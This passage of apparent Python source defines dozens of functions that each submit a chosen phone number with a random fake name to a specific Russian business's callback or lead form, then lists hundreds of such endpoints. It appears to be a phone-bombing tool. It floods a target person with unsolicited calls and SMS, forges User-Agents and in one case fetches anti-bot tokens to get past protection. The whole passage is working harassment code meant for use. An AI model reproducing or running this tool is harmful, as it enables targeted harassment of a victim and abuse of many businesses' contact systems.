    d = {"action": "callback_form", "phone": p["raw"], "name": rn()}
    async with s.post(url, data=d, headers={"User-Agent": ua(), "X-Requested-With": "XMLHttpRequest"}, timeout=15) as r: return r.status, await r.text()

async def send_svet_i_to4ka(s, p):
    url = "https://svet-i-to4ka.ru/form.php"
    d = {"name": rn(), "phone": p["digits_7"]}
    async with s.post(url, data=d, headers={"User-Agent": ua()}, timeout=15) as r: return r.status, await r.text()

async def send_centrremsant(s, p):
    url = "https://centrremsant.ru/order_ajax"
    d = {"name": rn(), "phone": p["digits_7"]}
    async with s.post(url, data=d, headers={"User-Agent": ua(), "X-Requested-With": "XMLHttpRequest"}, timeout=15) as r: return r.status, await r.text()

async def send_gor_master_new(s, p):
    url = "https://gor-master.ru/order/create"
    d = {"name": rn(), "phone": p["digits_7"], "service": random.choice(SERV), "address": ra()}
    async with s.post(url, data=d, headers={"User-Agent": ua()}, timeout=15) as r: return r.status, await r.text()

async def send_domashniy_masterok(s, p):
    url = "https://domashniy-masterok.ru/local/templates/main/components/it24/template/modal_form_order/ajax/send_order.php"
    d = {"name": rn(), "phone": p["digits_7"]}
    async with s.post(url, data=d, headers={"User-Agent": ua(), "X-Requested-With": "XMLHttpRequest"}, timeout=15) as r: return r.status, await r.text()

async def send_tilda_new(s, p):
    url = "https://forms.tildaapi.com/procces/"
    d = {"formservices[]": "515be7c975615827d3ffddc877030765", "Name": rn(), "Phone": p["raw"], "Checkbox": "yes"}
    async with s.post(url, data=d, headers={"User-Agent": ua()}, timeout=15) as r: return r.status, await r.text()

async def send_xn_htbbbqjs1apg(s, p):
    url = "https://xn----htbbbqjs1apg.xn--p1ai/thanks"
    d = {"name": rn(), "phone": p["formatted"], "message": "Консультация"}
    async with s.get(url, params=d, headers={"User-Agent": ua()}, timeout=15) as r: return r.status, await r.text()

async def send_arline(s, p):
    url = "https://arline.ru/catalog/stenovye-paneli/stenovaya_panel_v_interere_spalni/"
    d = {"name": rn(), "phone": p["digits_7"], "email": re_()}
    async with s.post(url, data=d, headers={"User-Agent": ua()}, timeout=15, allow_redirects=False) as r: return r.status, await r.text()

async def send_kostyukov(s, p):
    url = "https://kostyukov.design/send.php"
    d = {"name": rn(), "phone": p["formatted"]}
    async with s.post(url, data=d, headers={"User-Agent": ua()}, timeout=15, allow_redirects=False) as r: return r.status, await r.text()

async def send_vira_bitrix(s, p):
    url = "https://vira.bitrix24.ru/bitrix/services/main/ajax.php?action=crm.site.form.fill"
    d = {"fields": {"NAME": rn(), "PHONE": [{"VALUE": p["digits_7"]}]}}
    async with s.post(url, json=d, headers={"User-Agent": ua(), "Content-Type": "application/json"}, timeout=15) as r: return r.status, await r.text()

async def send_remont_fm(s, p):
    url = "https://remont.fm/wp-json/contact-form-7/v1/contact-forms/3237/feedback"
    d = {"your-name": rn(), "your-phone": p["raw"], "your-message": "Ремонт"}
    async with s.post(url, json=d, headers={"User-Agent": ua(), "Content-Type": "application/json"}, timeout=15) as r: return r.status, await r.text()

async def send_1000remontov(s, p):
    url = "https://1000remontov.ru/wp-json/contact-form-7/v1/contact-forms/5782/feedback"
    d = {"your-name": rn(), "your-phone": p["raw"], "your-message": "Ремонт"}
    async with s.post(url, json=d, headers={"User-Agent": ua(), "Content-Type": "application/json"}, timeout=15) as r: return r.status, await r.text()

async def send_sdelano(s, p):
    url = "https://sdelano.ru/ajax/form_send.php"
    d = {"name": rn(), "phone": p["digits_7"]}
    async with s.post(url, data=d, headers={"User-Agent": ua(), "X-Requested-With": "XMLHttpRequest"}, timeout=15) as r: return r.status, await r.text()

async def send_remont_kvartiry_msk(s, p):
    url = "https://remont-kvartiry-msk.ru/wp-json/contact-form-7/v1/contact-forms/24/feedback"
    d = {"your-name": rn(), "your-phone": p["raw"], "your-message": "Ремонт квартиры"}
    async with s.post(url, json=d, headers={"User-Agent": ua(), "Content-Type": "application/json"}, timeout=15) as r: return r.status, await r.text()

async def send_emailjs(s, p):
    url = "https://api.emailjs.com/api/v1.0/email/send"
    d = {"service_id": "default_service", "template_id": "template_contact", "user_id": "user_id", "template_params": {"name": rn(), "phone": p["digits_7"], "email": re_()}}
    async with s.post(url, json=d, headers={"User-Agent": ua(), "Content-Type": "application/json"}, timeout=15) as r: return r.status, await r.text()

async def send_reforma_msk(s, p):
    url = "https://reforma.msk.ru/-/x-api/v1/public/"
    params = {"method": "form/postform", "param[form_id]": "51173305", "param[tpl]": "global:lp.form.tpl"}
    d = {"name": rn(), "phone": p["digits_7"], "email": re_()}
    async with s.post(url, params=params, json=d, headers={"User-Agent": ua(), "Content-Type": "application/json"}, timeout=15) as r: return r.status, await r.text()

async def send_prochistka_vent(s, p):
    url = "https://prochistka-vent.ru/wp-json/contact-form-7/v1/contact-forms/1326/feedback"
    d = {"your-name": rn(), "your-phone": p["raw"], "your-message": "Прочистка вентиляции"}
    async with s.post(url, json=d, headers={"User-Agent": ua(), "Content-Type": "application/json"}, timeout=15) as r: return r.status, await r.text()

async def send_services_santehnik_moscow(s, p):
    url = "https://services-santehnik-moscow.ru/wp-json/contact-form-7/v1/contact-forms/99/feedback"
    d = {"your-name": rn(), "your-phone": p["raw"], "your-message": "Сантехник"}
    async with s.post(url, json=d, headers={"User-Agent": ua(), "Content-Type": "application/json"}, timeout=15) as r: return r.status, await r.text()

async def send_pereezd_ru(s, p):
    url = f"https://www.pereezd.ru/"
    params = {"phone": p["formatted"], "delayed_call_time": ""}
    async with s.get(url, params=params, headers={"User-Agent": ua()}, timeout=15) as r: return r.status, await r.text()

async def send_msk_gruzovichkof(s, p):
    url = "https://msk.gruzovichkof.ru/api/request"
    d = {"phone": p["digits_7"], "name": rn(), "comment": "Грузоперевозки"}
    async with s.post(url, json=d, headers={"User-Agent": ua(), "Content-Type": "application/json"}, timeout=15) as r: return r.status, await r.text()

async def send_gruz24msk(s, p):
    url = "https://gruz24msk.ru/wp-content/themes/movers/success.php"
    d = {"name": rn(), "phone": p["formatted"]}
    async with s.post(url, data=d, headers={"User-Agent": ua()}, timeout=15) as r: return r.status, await r.text()

async def send_gruz_im(s, p):
    url = "https://gruz-im.ru/ajax/action.php"
    d = {"name": rn(), "phone": p["digits_7"], "action": "callback"}
    async with s.post(url, data=d, headers={"User-Agent": ua(), "X-Requested-With": "XMLHttpRequest"}, timeout=15) as r: return r.status, await r.text()

async def send_atlantgruz(s, p):
    url = "https://atlantgruz.ru/assets/components/ajaxform/action.php"
    fk = hashlib.md5(f"{p['digits_7']}{time.time()}".encode()).hexdigest()[:16]
    d = {"phone": p["raw"], "name": rn(), "form_key": fk, "agree": "on"}
    async with s.post(url, data=d, headers={"User-Agent": ua(), "X-Requested-With": "XMLHttpRequest"}, timeout=15) as r: return r.status, await r.text()

async def send_zel_luch(s, p):
    url = "https://zel-luch.ru/mod/project/815387/lead/send/"
    d = {"name": rn(), "phone": p["digits_7"], "email": re_()}
    async with s.post(url, json=d, headers={"User-Agent": ua(), "Content-Type": "application/json"}, timeout=15) as r: return r.status, await r.text()

async def send_xn_c1aidaj7av7a(s, p):
    url = "https://xn--c1aidaj7av7a.xn--p1ai/-/x-api/v1/public/"
    params = {"method": "form/postform", "param[form_id]": "112636116"}
    d = {"name": rn(), "phone": p["digits_7"], "email": re_()}
    async with s.post(url, params=params, json=d, headers={"User-Agent": ua(), "Content-Type": "application/json"}, timeout=15) as r: return r.status, await r.text()

async def send_bruttocrm(s, p):
    url = "https://bruttocrm.ru/api/site-leads"
    d = {"name": rn(), "phone": p["digits_7"], "email": re_()}
    async with s.post(url, json=d, headers={"User-Agent": ua(), "Content-Type": "application/json"}, timeout=15) as r: return r.status, await r.text()

async def send_gruzchikoff(s, p):
    url = "https://gruzchikoff.ru/-/x-api/v1/public/"
    params = {"method": "form/postform", "param[form_id]": "27696700"}
    d = {"name": rn(), "phone": p["digits_7"], "email": re_()}
    async with s.post(url, params=params, json=d, headers={"User-Agent": ua(), "Content-Type": "application/json"}, timeout=15) as r: return r.status, await r.text()

async def send_vyvoz_musora_moscow(s, p):
    url = "https://vyvoz-musora.moscow/wp-admin/admin-ajax.php"
    d = {"action": "callback_form", "phone": p["raw"], "name": rn()}
    async with s.post(url, data=d, headers={"User-Agent": ua(), "X-Requested-With": "XMLHttpRequest"}, timeout=15) as r: return r.status, await r.text()

async def send_spetstrans(s, p):
    url = "https://spetstrans.ru/wp-admin/admin-ajax.php"
    d = {"action": "callback_form", "phone": p["raw"], "name": rn()}
    async with s.post(url, data=d, headers={"User-Agent": ua(), "X-Requested-With": "XMLHttpRequest"}, timeout=15) as r: return r.status, await r.text()

async def send_zabirator_new(s, p):
    url = "https://zabirator.ru/action_site/send_order_window"
    d = {"name": rn(), "phone": p["formatted"], "item": "Вывоз мусора"}
    async with s.post(url, data=d, headers={"User-Agent": ua()}, timeout=15) as r: return r.status, await r.text()

async def send_vyvoz_musora24(s, p):
    url = "https://vyvoz-musora24.moscow/assets/components/ajaxform/action.php"
    fk = hashlib.md5(f"{p['digits_7']}{time.time()}".encode()).hexdigest()[:16]
    d = {"phone": p["raw"], "name": rn(), "form_key": fk, "agree": "on"}
    async with s.post(url, data=d, headers={"User-Agent": ua(), "X-Requested-With": "XMLHttpRequest"}, timeout=15) as r: return r.status, await r.text()

async def send_gruppabazis(s, p):
    url = "https://gruppabazis.ru/local/ajax/"
    token = await fetch_smart_token(s, "https://gruppabazis.ru/")
    d = {"phone": p["digits_7"], "name": rn()}
    if token:
        d["smart-token"] = token
    async with s.post(url, data=d, headers={"User-Agent": ua(), "X-Requested-With": "XMLHttpRequest"}, timeout=15) as r: return r.status, await r.text()

async def send_vivozmusara(s, p):
    url = "https://vivozmusara.ru/wp-admin/admin-ajax.php"
    d = {"action": "callback_form", "phone": p["raw"], "name": rn()}
    async with s.post(url, data=d, headers={"User-Agent": ua(), "X-Requested-With": "XMLHttpRequest"}, timeout=15) as r: return r.status, await r.text()

async def send_uvozim_musor(s, p):
    url = "https://uvozim-musor.ru/"
    d = {"name": rn(), "phone": p["formatted"], "message": "Вывоз мусора"}
    async with s.post(url, data=d, headers={"User-Agent": ua()}, timeout=15) as r: return r.status, await r.text()

async def send_whitesaas_new(s, p):
    url = "https://whitesaas.com/api?action=call"
    d = {"phone": p["digits_7"], "name": rn()}
    async with s.post(url, data=d, headers={"User-Agent": ua()}, timeout=15) as r: return r.status, await r.text()

async def send_musorunet(s, p):
    url = "https://www.musorunet.ru/callme/lib/send.php"
    params = {
        "contentType": "text/html; charset=utf-8",
        "cs[]": ["Имя", "Телефон", "Согласие на обработку", "Источник трафика", "Страница с запросом"],
        "os[]": [rn(), p["formatted"], "Да", "https://yandex.ru/", "https://www.musorunet.ru/"]
    }
    async with s.get(url, params=params, headers={"User-Agent": ua()}, timeout=15) as r: return r.status, await r.text()

async def send_tpereezd(s, p):
    url = "https://tpereezd.ru/vyvoz-musora/"
    d = {"name": rn(), "phone": p["digits_7"]}
    async with s.post(url, data=d, headers={"User-Agent": ua()}, timeout=15) as r: return r.status, await r.text()

async def send_ooo_troya(s, p):
    url = "https://ooo-troya.ru/wp-content/themes/ekotrans/inc/zakaz.php"
    d = {"name": rn(), "phone": p["digits_7"]}
    async with s.post(url, data=d, headers={"User-Agent": ua()}, timeout=15) as r: return r.status, await r.text()

async def send_mct_rent(s, p):
    url = "https://mct-rent.ru/local/ajax/forms.php"
    d = {"name": rn(), "phone": p["digits_7"]}
    async with s.post(url, data=d, headers={"User-Agent": ua(), "X-Requested-With": "XMLHttpRequest"}, timeout=15) as r: return r.status, await r.text()

async def send_vanna_msk(s, p):
    url = "https://vanna-msk.ru/callback/"
    d = {"name": rn(), "phone": p["formatted"]}
    async with s.post(url, data=d, headers={"User-Agent": ua()}, timeout=15) as r: return r.status, await r.text()

async def send_panel_remont(s, p):
    url = "https://panel-remont.ru/wp-admin/admin-ajax.php"
    d = {"action": "callback_form", "phone": p["raw"], "name": rn()}
    async with s.post(url, data=d, headers={"User-Agent": ua(), "X-Requested-With": "XMLHttpRequest"}, timeout=15) as r: return r.status, await r.text()

async def send_dom_asov(s, p):
    url = "https://dom-asov.ru/wp-admin/admin-ajax.php"
    d = {"action": "callback_form", "phone": p["raw"], "name": rn()}
    async with s.post(url, data=d, headers={"User-Agent": ua(), "X-Requested-With": "XMLHttpRequest"}, timeout=15) as r: return r.status, await r.text()

async def send_idealvann(s, p):
    url = "https://idealvann.ru/assets/components/ajaxform/action.php"
    fk = hashlib.md5(f"{p['digits_7']}{time.time()}".encode()).hexdigest()[:16]
    d = {"phone": p["raw"], "name": rn(), "form_key": fk, "agree": "on"}
    async with s.post(url, data=d, headers={"User-Agent": ua(), "X-Requested-With": "XMLHttpRequest"}, timeout=15) as r: return r.status, await r.text()

async def send_remont_wann(s, p):
    url = "https://remont-wann.ru/wp-json/contact-form-7/v1/contact-forms/4/feedback"
    d = {"your-name": rn(), "your-phone": p["raw"], "your-message": "Ремонт ванн"}
    async with s.post(url, json=d, headers={"User-Agent": ua(), "Content-Type": "application/json"}, timeout=15) as r: return r.status, await r.text()

async def send_lidervann(s, p):
    url = "https://lidervann.ru/wp-content/plugins/toplabs-callback/send.php"
    params = {"id": "2"}
    d = {"name": rn(), "phone": p["digits_7"]}
    async with s.post(url, params=params, data=d, headers={"User-Agent": ua()}, timeout=15) as r: return r.status, await r.text()

async def send_mossanuzel(s, p):
    url = "https://mossanuzel.ru/system/ajax"
    d = {"name": rn(), "phone": p["digits_7"], "form_id": "callback"}
    async with s.post(url, data=d, headers={"User-Agent": ua(), "X-Requested-With": "XMLHttpRequest"}, timeout=15) as r: return r.status, await r.text()

async def send_remmont(s, p):
    url = "https://remmont.ru/"
    d = {"name": rn(), "phone": p["formatted"], "message": "Ремонт"}
    async with s.post(url, data=d, headers={"User-Agent": ua()}, timeout=15) as r: return r.status, await r.text()

async def send_xn_6kcaiv0bpead0bpk1d(s, p):
    url = "https://xn-----6kcaiv0bpead0bpk1d.xn--p1ai/actions/send.php"
    d = {"name": rn(), "phone": p["digits_7"]}
    async with s.post(url, data=d, headers={"User-Agent": ua()}, timeout=15) as r: return r.status, await r.text()

# ==================== ПОЛНЫЙ СПИСОК ЭНДПОИНТОВ (540+ шт) ====================
endpoints_list = [
    # Автодилеры (блок 1)
    ("createOrder_1", send_createOrder_1),
    ("smartpoint", send_smartpoint),
    ("credit_php", send_credit_php),
    ("volokolamka", send_volokolamka),
    ("alea", send_alea),
    ("calltouch_working", send_calltouch_working),
    ("calltouch_user_form", send_calltouch_user_form),
    ("exeed", send_exeed),
    ("api_calltouch", send_api_calltouch),
    ("calltouch_widget", send_calltouch_widget),
    ("akross", send_akross),
    ("callkeeper", send_callkeeper),
    ("lada_autosvetlana", send_lada_autosvetlana),
    ("avto_center_geely", send_avto_center_geely),
    ("europlan", send_europlan),
    ("vis_finauto", send_vis_finauto),
    ("avto_center_chery", send_avto_center_chery),
    ("tilda_auto", send_tilda_auto),
    ("sim_lada", send_sim_lada),
    ("konget", send_konget),
    ("autoclass_lada", send_autoclass_lada),
    ("autoelysium", send_autoelysium),
    ("baic", send_baic),
    ("calltouch_model2", send_calltouch_model2),
    ("tempa_cars", send_tempa_cars),
    ("car_application", send_car_application),
    ("bercar_ajax", send_bercar_ajax),
    ("bercar_get", send_bercar_get),
    
    # Автошколы (блок 2)
    ("yar_avtoshkola", send_yar_avtoshkola),
    ("whitesaas_gang_lux", send_whitesaas_gang_lux),
    ("avtoshkola_master76", send_avtoshkola_master76),
    ("tr77_gotocourse", send_tr77_gotocourse),
    ("tilda_autoschool", send_tilda_autoschool),
    ("xn_avtoshkola", send_xn_avtoshkola),
    ("idriver", send_idriver),
    ("leadgrab", send_leadgrab),
    ("tr77_extended", send_tr77_extended),
    ("whitesaas_avtoshkola54", send_whitesaas_avtoshkola54),
    ("tilda_favorit", send_tilda_favorit),
    
    # Разное (блок 3)
    ("adaurum_sms", send_adaurum_sms),
    ("gornye_vysoty", send_gornye_vysoty),
    ("Comagic", send_comagic),
    ("KrasnoeBeloe", send_krasnoeibeloe),
    ("KuhniVivat", send_kuhnivivat),
    ("BigMebel", send_bigmebel),
    ("DomDivanov76", send_domdivanov76),
    ("Pushe", send_pushe),
    ("Stolplit", send_stolplit),
    ("Lemanapro", send_lemanapro),
    ("CallTouch_Shatura", send_calltouch_shatura),
    ("VkusVill", send_vkusvill),
    ("Hoff_Callback", send_hoff_callback),
    ("Hypermarket_Callback", send_hypermarketmebel_callback),
    ("tilda_kuhni", send_tilda_kuhni),
    ("Auchan_CheckPhone", send_auchan_checkphone),
    ("TradeDealer", send_tradedealer),
    ("AVR_Rostov", send_avr_rostov),
    ("API_Used_GraphQL", send_api_used_graphql),
    ("NP_Auto_CF7", send_npauto_cf7),
    ("AS_Avtomotors", send_asavtomotors),
    ("SROSL_Leads", send_srosl_leads),
    ("EcolesPB_Leads", send_ecolespb_leads),
    ("Stanki_Lead", send_stanki_lead),
    ("AlfaZdrav_CallTouch", send_alfazdrav_calltouch),
    ("McMedikor_Form", send_mcmedikor_form),
    ("GP76_AdminAjax", send_gp76_admin_ajax),
    ("SMClinic_Register", send_smclinic_register),
    ("SMClinic_Ryazan_Register", send_smclinic_ryazan_register),
    ("Medeor74_PlasticForm", send_medeor74_plastic_form),
    ("MedCentr56_AjaxForm", send_medcentr56_ajaxform),
    ("Zdorovie33_AjaxForm", send_zdorovie33_ajaxform),
    ("Sitimed_CF7", send_sitimed_cf7),
    ("Stiralservis_Mail", send_stiralservis_mail),
    ("Plastkom_Feedback", send_plastkom_feedback),
    ("Rosstroy76_Callback", send_rosstroy76_callback),
    ("OknaTrade_Callback", send_oknatrade_callback),
    ("Shveynoe_Proizvodstvo", send_shveynoe_proizvodstvo),
    ("tilda_nebalkon", send_tilda_nebalkon),
    ("Okna_Olkon_Send", send_okna_olkon_send),
    ("Dom_NN52_Mail", send_dom_nn52_mail),
    ("OknaRussia39_Ajax", send_oknaprussia39_ajax),
    ("OknaMoskva_CF7", send_okna_moskva_cf7),
    ("Steklodom_Ajax", send_steklodom_ajax),
    ("Planetasvet_CF7", send_planetasvet_cf7),
    ("tilda_oknawdom", send_tilda_oknawdom),
    ("OsteclenieBalkona_Ajax", send_osteclenie_balkona_ajax),
    ("AlSolution_AjaxForm", send_al_solution_ajaxform),
    ("PlastikovyeOknaKazan_CF7", send_plastikovye_okna_kazan_cf7),
    ("Dves_Zakaz", send_dves_zakaz),
    ("Meridian72_Ajax", send_meridian72_ajax),
    ("CallTouch_655_Register", send_calltouch_655_register),
    ("OknoMoskva_Ajax", send_okno_moskva_ajax),
    ("Rosstroy44_Callback", send_rosstroy44_callback),
    ("Panokna_Callback", send_panokna_callback),
    ("Potolochnik24", send_potolochnik24),
    ("Yarmontag_Collback", send_yarmontag_collback),
    ("Potolkii_CF7", send_potolkii_cf7),
    ("XN_Mail", send_xn_mail_php),
    ("NatPotolok_Sender", send_natpotolok),
    ("RumExpert", send_rumexpert),
    ("KoronaRemont", send_korona_remont),
    ("StroyYaroslavl", send_stroy_yaroslavl),
    ("Kronvest_AjaxForm", send_kronvest),
    ("VorotaYaroslavl", send_vorota_yaroslavl),
    ("YaroslavlZabory", send_yaroslavl_zabory),
    ("XN_Plastic_CF7", send_xn_plastic_cf7),
    ("Rusklimat_SMS", send_rusklimat_sms),
    ("ClimaVent", send_clima_vent),
    ("Vasko_Callback", send_vasko),
    ("Gruzovichkof_API", send_gruzovichkof),
    ("Ecorex_Ajax", send_ecorex),
    ("Geradez_OrderCall", send_geradez),
    ("DezComfort_AjaxForm", send_dez_comfort),
    ("DezServis76", send_dezservis76),
    ("AlfaStrah_Callback", send_alfastrah),
    ("AnAnk_Zvonok", send_an_ank),
    ("NZabota_Callback", send_nzabota_callback),
    ("Teleboss_QuickCall", send_teleboss_quick_call),
    ("Neoavto_Ajax", send_neoavto_ajax),
    ("MOPB_Pposad_CF7", send_mopb_pposad_cf7),
    ("BaltCourier_CallMe", send_baltcourier_callback),
    ("TempoPlus_Ajax", send_tempo_plus_ajax),
    ("CallTouch_13689", send_calltouch_13689),
    ("Lakres_Callback", send_lakres_callback),
    ("Lami24_CF7", send_lami24_cf7),
    ("OPTRF_Callback", send_optrf_callback),
    ("McDog_CF7", send_mcdog_cf7),
    ("Santekhnikoff_Callback", send_santekhnikoff_callback),
    ("Gatchina_MasteraByta_CF7", send_gatchina_masterabyta_cf7),
    ("CallTouch_35146", send_calltouch_35146),
    ("Botfaqtor_Visit", send_botfaqtor_visit),
    ("Vet03_Callback", send_vet03_callback),
    ("VeterinarSPB_CF7", send_veterinarspb_cf7),
    ("BancaIntesa_Ajax", send_bancaintesa_ajax),
    ("SNBank_Callback", send_snbank_callback),
    ("XN12_Ajax", send_xn12_ajax),
    ("BystroBank_Callback", send_bystrobank_callback),
    ("Cvetarius_Feedback", send_cvetarius_feedback),
    ("NovayaGollandiya_Callback", send_novayagollandiya_callback),
    ("Voevoda_Bitrix24", send_voevoda_bitrix),
    ("Lenremont_CF7", send_lenremont_cf7),
    ("SantehnikUslugi_CF7", send_santehnik_uslugi_cf7),
    ("Callibri_Callback", send_callibri_callback),
    ("MKA_SPB_Callback", send_mka_spb_callback),
    ("AdvokatHelp_CF7", send_advokat_help_cf7),
    ("SPB_Ritual", send_spb_ritual),
    ("Ratusha_Thanks", send_ratusha_thanks),
    ("XN8sbecmvk6adqeriw", send_xn8sbecmvk6adqeriw),
    ("CloudPBX_RT", send_cloudpbx_rt),
    ("Ritual_Doverie", send_ritual_doverie),
    ("GlobalDrive_Callback", send_globaldrive_callback),
    ("Tarantasik", send_tarantasik),
    ("GetTruck_Recall", send_gettruck_recall),
    ("Gruzovichkof_SPB", send_gruzovichkof_spb),
    ("GlavDostavka", send_glav_dostavka),
    ("ProfGruzSPB", send_profgruzspb),
    ("SPB_Perevozka", send_spb_perevozka),
    ("ProfInstitute_Bitrix24", send_profinstitute_bitrix),
    ("Zabirator_Callback", send_zabirator_callback),
    ("WashaNyanya_CF7", send_washanyanya_cf7),
    ("President_Medical", send_president_medical),
    ("MPKPrognoz_CF7", send_mpkprognoz_cf7),
    ("P27SPB_CF7", send_p27spb_cf7),
    ("OnkoUrologi", send_onkourologi),
    ("Stop_Alko", send_stop_alko),
    ("Narnika", send_narnika),
    ("Doctoredet24", send_doctoredet24),
    ("Piter_Bez_Narkotikov", send_piter_bez_narkotikov),
    ("Narkolog_Express", send_narkolog_express),
    ("Doctor_SPB", send_doctor_spb),
    ("Mebelhit_SPB", send_mebelhit_spb),
    ("FormDesigner", send_formdesigner),
    ("Tomsk_Santechnici", send_tomsk_santechnici),
    ("Santehnik70_Zakaz", send_santehnik70_zakaz),
    ("Tomsk_OkMasterOk", send_tomsk_okmasterok),
    ("MultiClinic", send_multiclinic),
    ("SantehnikPerm_CF7", send_santehnikperm_cf7),
    ("Perm_FL99", send_perm_fl99),
    ("Perm_GorMaster", send_perm_gormaster),
    ("Perm_ProfivDom", send_perm_profivdom),
    ("Volgograd_Santehnikoff", send_volgograd_santehnikoff),
    ("Volgograd_OkMasterOk", send_volgograd_okmasterok),
    ("Santehnik70_Online", send_santehnik70_online),
    ("Tomsk_SanTehnikiCom", send_tomsk_santehniki_com),
    ("CallTouch_1884", send_calltouch_1884),
    ("Mango_Office", send_mango_office),
    ("Fokus_Komforta", send_fokus_komforta),
    ("RemontOkon_Company", send_remontokon_company),
    ("CallTouch_14095", send_calltouch_14095),
    ("Pskov_MasteraByta_CF7", send_pskov_masterabyta_cf7),
    ("Pskov_RemontGIS", send_pskov_remontgis),
    ("Pskov_Pozitive", send_pskov_pozitive),
    ("Pskov_Evakuatorok", send_pskov_evakuatorok),
    ("MeTalk_API", send_metalk_api),
    ("Perevozka24", send_perevozka24),
    ("Pskov_ServisAKPP", send_pskov_servisakpp),
    ("PrizyvaNet_CF7", send_prizyvanet_cf7),
    ("Pskov_Autoschool", send_pskov_autoschool),
    ("PDBG_FetchIt", send_pdbg_fetchit),
    ("RitualVechnostSPB", send_ritualvechnostspb),
    ("Mos_Ritual", send_mos_ritual),
    ("Horonim", send_horonim),
    ("GKRS_SPB_SMS", send_gkrs_spb_sms),
    ("XN52_AjaxChunk", send_xn52_ajaxchunk),
    ("Ritual_Voronezh", send_ritual_voronezh),
    ("AvtoGruz_SPB", send_avtogruz_spb),
    ("Gruso_Perevozchik", send_gruso_perevozchik),
    ("Tamozhennyy_Broker", send_tamozhennyy_broker),
    ("Sigma_Trans", send_sigma_trans),
    ("Kuda_Vezti", send_kuda_vezti),
    ("ABSTD_Callback", send_abstd_callback),
    ("Elephant_Moving", send_elephant_moving),
    ("Comagic_v1", send_comagic_v1),
    ("YarTrans", send_yartrans),
    ("Poleznoo_Callback", send_poleznoo_callback),
    ("Oniks_Clinic", send_oniks_clinic),
    ("Psychiatr_Clinic", send_psychiatr_clinic),
    ("Detox24", send_detox24),
    ("Perm_President_Medical", send_perm_president_medical),
    ("Narkolog_Express_Add", send_narkolog_express_add),
    ("Tomsk_Triumf_Center", send_tomsk_triumf_center),
    ("Tomsk_Stop_Alko", send_tomsk_stop_alko),
    ("Sochi_Metod_Dovzhenko", send_sochi_metod_dovzhenko),
    ("Sochiinsite_CF7", send_sochiinsite_cf7),
    ("Zapoy_Sochi", send_zapoy_sochi),
    ("Stocrm_Callback", send_stocrm_callback),
    ("Stokoney_API", send_stokoney_api),
    ("Autoprofi70", send_autoprofi70),
    ("Tomsk_Rmasla", send_tomsk_rmasla),
    ("Petrozavodsk_SanTehniki", send_petrozavodsk_santehniki),
    ("Petrozavodsk_DMastera", send_petrozavodsk_dmastera),
    ("Petrozavodsk_DMastera_CF7", send_petrozavodsk_dmastera_cf7),
    ("Santehnik_Murmansk", send_santehnik_murmansk),
    ("Esih_Form", send_esih_form),
    ("Murmansk_NatPotolok", send_murmansk_natpotolok),
    ("Murmansk_Slesarek", send_murmansk_slesarek),
    ("Murmansk_Zamena_Zamkov", send_murmansk_zamena_zamkov),
    ("Muzhnachas_Murmansk", send_muzhnachas_murmansk),
    ("Murmansk_Mchs_Zamkov24", send_murmansk_mchs_zamkov24),
    ("Murmansk_Mishka_Servis", send_murmansk_mishka_servis),
    ("Murmansk_ProfivDom", send_murmansk_profivdom),
    ("Murmansk_Rukaster", send_murmansk_rukaster),
    ("Master_220_Callback", send_master_220_callback),
    ("XN7kcbanpdvcesbfcd5bb3cmmqigc3e5k", send_xn7kcbanpdvcesbfcd5bb3cmmqigc3e5k),
    ("Vologda_MasteraByta_CF7", send_vologda_masterabyta_cf7),
    ("Vologda_Santechnici", send_vologda_santechnici),
    ("Vologda_FL99", send_vologda_fl99),
    ("Komsis_SU", send_komsis_su),
    ("Vologda_MsRemont", send_vologda_msremont),
    ("AutoElectric_SPB", send_autoelectric_spb),
    ("Auto_Help78_CF7", send_auto_help78_cf7),
    ("Scady", send_scady),
    ("XN51_Avtoshkola", send_xn51_avtoshkola),
    ("Chempionauto_CF7", send_chempionauto_cf7),
    ("Avtoshkola_V_Murino", send_avtoshkola_v_murino),
    ("Tomsk_Gsritual", send_tomsk_gsritual),
    ("Ritual59", send_ritual59),
    ("CallTouch_Ritual", send_calltouch_ritual),
    ("Perm_Ritual_Doverie", send_perm_ritual_doverie),
    ("PRK_Perm", send_prk_perm),
    ("RitualRating", send_ritualrating),
    ("Avtoshkola4Kolesa_CF7", send_avtoshkola4kolesa_cf7),
    ("AD78_CF7", send_ad78_cf7),
    ("3VOA", send_3voa),
    ("CallTouch_3VOA", send_calltouch_3voa),
    ("Dar_Med", send_dar_med),
    ("VenerologNN", send_venerolognn),
    ("FMBAFMBc_Ajax", send_fmbafmbc_ajax),
    ("Tomsk_Genom_Eko", send_tomsk_genom_eko),
    ("Tomsk_TheBears", send_tomsk_thebears),
    ("Stomatologiya_Tomsk_3L", send_stomatologiya_tomsk_3l),
    ("XN80audlaff4h", send_xn80audlaff4h),
    ("AlteraInvest_Ajax", send_alterainvest_ajax),
    ("Tomsk_Garant_SPB", send_tomsk_garant_spb),
    ("PowerTomsk", send_powertomsk),
    ("Tomsk_Veb_Avtoservice", send_tomsk_veb_avtoservice),
    ("AfonyaMaster", send_afonyamaster),
    ("StroyGarantPskov", send_stroygarantpskov),
    ("Santexnk_Pskov", send_santexnk_pskov),
    ("Pskov_Kamprok", send_pskov_kamprok),
    ("Pskov_MasterVdom", send_pskov_mastervdom),
    ("Pskov_S5R", send_pskov_s5r),
    ("Pskov_AgExperts", send_pskov_agexperts),
    ("Bitrix_Koreanagroup", send_bitrix_koreanagroup),
    ("Jivosite_Callback", send_jivosite_callback),
    ("EnjoyTouch_Callback", send_enjoytouch_callback),
    ("VideoCam_SPB", send_videocam_spb),
    ("CallTouch_2109", send_calltouch_2109),
    ("CameraBazar", send_camerabazar),
    ("FrontCam_Bitrix", send_frontcam_bitrix),
    ("PeterStyle_Popup", send_peterstyle_popup),
    ("Ruelle17", send_ruelle17),
    ("Tomsk_Escaper", send_tomsk_escaper),
    ("Tomsk_1001Halat", send_tomsk_1001halat),
    ("Maglena_Tomsk", send_maglena_tomsk),
    ("Apostrof_SU", send_apostrof_su),
    ("Ecco_Callback", send_ecco_callback),
    ("Kazan_Indever", send_kazan_indever),
    ("Kazan_Spetstek_CF7", send_kazan_spetstek_cf7),
    ("Albione_Callback", send_albione_callback),
    ("Weissgauff_Ajax", send_weissgauff_ajax),
    ("KristallKazan", send_kristallkazan),
    ("Figurist_Ajax", send_figurist_ajax),
    ("Kazan_Gruzovichkof", send_kazan_gruzovichkof),
    ("RfDataCenter_Calls", send_rfdatacenter_calls),
    ("Basan16_Feedback", send_basan16_feedback),
    ("RKOB_ConvertForms", send_rkob_convertforms),
    ("Ochkarik_Callback", send_ochkarik_callback),
    ("Sochi_Avtoshkola_CF7", send_sochi_avtoshkola_cf7),
